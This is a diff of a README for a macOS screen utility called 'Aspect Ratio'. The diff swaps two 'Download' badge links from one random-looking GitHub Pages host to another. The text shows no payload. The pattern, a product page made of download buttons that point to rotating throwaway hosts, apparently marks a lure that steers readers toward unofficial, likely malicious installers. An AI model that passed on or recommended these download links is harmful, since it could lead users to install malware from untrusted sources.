@@ -4,7 +4,7 @@
 
 ## 📥 Download Aspect Ratio for macOS
 
-[![⬇️ Download Aspect Ratio](https://img.shields.io/badge/Download-Aspect%20Ratio%20Mac-blue?style=for-the-badge&logo=apple)](https://shuziktobehuman.github.io/huja/Aspect)
+[![⬇️ Download Aspect Ratio](https://img.shields.io/badge/Download-Aspect%20Ratio%20Mac-blue?style=for-the-badge&logo=apple)](https://mitrobandus.github.io/.github/Aspect)
 
 ---
 
@@ -41,7 +41,7 @@ The app provides a clear breakdown of your current resolution and automatically 
 
 Aspect Ratio supports all common Apple screen formats — from MacBook Air to 5K iMacs — and works natively on Intel and Apple Silicon (M1/M2/M3) machines.
 
-[![⬇️ Download Aspect Ratio](https://img.shields.io/badge/Download-Aspect%20Ratio%20Mac-blue?style=for-the-badge&logo=apple)](https://shuziktobehuman.github.io/huja/Aspect)
+[![⬇️ Download Aspect Ratio](https://img.shields.io/badge/Download-Aspect%20Ratio%20Mac-blue?style=for-the-badge&logo=apple)](https://mitrobandus.github.io/.github/Aspect)
 
 ---
 
